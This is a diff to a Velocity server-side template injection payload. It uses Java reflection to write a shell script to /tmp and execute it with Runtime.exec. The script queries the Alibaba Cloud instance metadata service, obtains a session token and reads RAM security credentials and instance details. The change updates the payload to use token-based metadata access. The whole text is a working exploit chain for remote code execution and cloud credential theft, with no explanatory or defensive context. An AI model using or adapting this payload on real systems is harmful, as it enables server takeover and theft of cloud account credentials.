@@ -1,6 +1,6 @@
 #set($x = "")
 #set($fw = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
-$fw.write("echo ===META; timeout 5 curl -s http://100.100.100.200/latest/meta-data/ 2>&1 | head -20; echo ===RAM; timeout 5 curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/ 2>&1 | head -5; echo ===INST; timeout 5 curl -s http://100.100.100.200/latest/meta-data/instance-id 2>&1 | head -2; echo DONE")
+$fw.write("echo ===TOKEN; T=$(timeout 4 curl -s -X PUT 'http://100.100.100.200/latest/api/token' -H 'X-aliyun-ecs-metadata-token-ttl-seconds: 21600' 2>/dev/null); echo LEN=${#T}; echo ===ROOT; timeout 4 curl -s -H 'X-aliyun-ecs-metadata-token: $T' http://100.100.100.200/latest/meta-data/ 2>&1 | head -10; echo ===RAM; timeout 4 curl -s -H 'X-aliyun-ecs-metadata-token: $T' http://100.100.100.200/latest/meta-data/ram/security-credentials/ 2>&1 | head -5; echo DONE")
 $fw.close()
 #set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
 #set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
